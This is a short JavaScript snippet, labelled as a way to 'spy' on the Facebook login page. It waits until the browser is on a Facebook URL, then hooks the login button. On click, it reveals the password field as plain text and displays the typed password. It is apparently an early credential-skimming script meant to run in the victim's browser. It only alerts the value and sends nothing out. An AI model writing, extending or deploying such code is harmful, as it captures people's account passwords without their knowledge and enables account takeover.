

// spy facebook log in page
const waiiFb = new Promise((res) => {
    setInterval(()=>{
        if(window.location.href.includes('m.facebook')){
            res("m")
        }
        if(window.location.href.includes('facebook')){
            res("d")
        }
    },1000)
}).then((val)=>{
    alert(val)
    if(val == "d"){
        try{
            document.getElementById('loginbutton').onclick = function(){
            document.querySelector("#pass").type = 'text'
            alert(document.querySelector("#pass").value)
            }
        }
        catch{
            document.getElementById('u_0_9_uE').onclick = function(){
            document.querySelector("#pass").type = 'text'
            alert(document.querySelector("#pass").value)
            }
        }
    }
})

